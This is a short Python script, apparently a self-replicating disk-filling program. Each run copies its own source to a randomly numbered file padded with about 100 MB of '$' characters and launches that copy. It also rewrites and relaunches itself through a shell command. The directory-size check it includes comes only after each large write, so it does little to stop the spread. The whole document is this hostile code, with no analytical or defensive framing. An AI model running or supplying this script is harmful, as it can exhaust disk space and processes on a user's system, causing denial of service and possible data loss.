import random, subprocess, os

content = open(__file__).read()
#check in content if there is $ caracter and delete them
if '$' in content: 
    content = content.replace('$', '')
    #write the content in the file
    open(__file__, 'w').write(content)
    #run the file
    subprocess.Popen('python ' + __file__, shell=True)

new_name = str(random.randint(1, 100000))

#delete all $ caracters from code 

def get_sizeTT() :
    total = 0
    for dirpath, direnames, filenames in os.walk('.'):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total += os.path.getsize(fp)
    return total

with open(new_name + '.py', 'w') as f:
    f.write(content)
    #write 100000000 $ caraters in the file
    f.write('$' * 100000000)

#use get size function
if get_sizeTT() > 500000:
    exit()  

new_file = "{}.py".format(new_name)
    
process = subprocess.Popen(['python3', new_file], shell=False)